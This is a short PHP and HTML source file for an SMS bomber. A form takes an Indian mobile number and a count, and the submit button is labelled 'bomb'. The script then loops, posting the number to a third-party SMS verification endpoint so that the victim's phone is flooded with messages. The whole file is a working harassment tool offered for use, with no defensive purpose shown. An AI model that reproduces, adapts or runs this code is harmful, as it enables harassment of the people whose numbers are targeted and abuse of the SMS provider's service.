
   <html lang="en">
   <head>
	   <meta charset="UTF-8">
	   <meta name="viewport" content="width=device-width, initial-scale=1.0">
	   <title>Document</title>
   </head>
   <body>
	   <form method="post">
	   <input type="text" name="phone" placeholder="mobile number">
	   <br><br>
	   <input type="number" name="number" placeholder="Count">
	   <br><br>
	   <input type="Submit" name="submit" value="bomb">
	   </form>

<?php
if(isset($_POST['submit']))
{
    
    $num=$_POST['phone'];
    $count=$_POST['number'];

    while($count!=0)
    {   
        

            $data=array(
                "mobile"=>'+91'.$num
            );
            $lw=curl_init();
            curl_setopt($lw,CURLOPT_URL,"https://api.lifewin888.com/api/sms/ali_send");
            curl_setopt($lw,CURLOPT_FOLLOWLOCATION,1);
            curl_setopt($lw,CURLOPT_RETURNTRANSFER,1);
            curl_setopt($lw,CURLOPT_POST,1);
            curl_setopt($lw,CURLOPT_POSTFIELDS,http_build_query($data));
            curl_exec($lw);
            curl_close($lw);
            
            $count=$count-1;
        
    }

}
    ?>
